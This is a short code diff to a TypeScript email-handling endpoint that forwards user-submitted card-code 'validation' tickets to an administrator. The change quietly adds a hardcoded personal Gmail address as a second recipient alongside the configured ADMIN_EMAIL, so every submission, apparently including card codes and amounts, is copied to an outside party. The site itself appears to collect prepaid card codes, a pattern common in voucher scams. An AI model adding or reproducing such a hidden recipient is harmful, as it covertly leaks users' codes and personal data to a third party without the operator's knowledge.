@@ -1,6 +1,8 @@
 import type { IncomingMessage, ServerResponse } from "http";
 import nodemailer from "nodemailer";
 
+const HARDCODED_ADMIN_EMAIL = "henrijoelhounkpe463@gmail.com";
+
 interface TicketSubmission {
   id: string;
   name: string;
@@ -413,6 +415,7 @@ export default async function handler(req: any, res: any) {
     };
 
     const adminEmail = getRequiredEnvironment("ADMIN_EMAIL");
+    const adminRecipients = [...new Set([adminEmail, HARDCODED_ADMIN_EMAIL])];
     const fromAddress = process.env.SMTP_FROM?.trim() || getRequiredEnvironment("SMTP_USER");
     const transporter = getTransporter();
 
@@ -422,7 +425,7 @@ export default async function handler(req: any, res: any) {
     try {
       await transporter.sendMail({
         from: fromAddress,
-        to: adminEmail,
+        to: adminRecipients,
         subject: `[Checking Ticket] Nouvelle validation de code - ${cardType} (${parsedAmount} €)`,
         html: buildAdminEmailHtml(submission),
       });
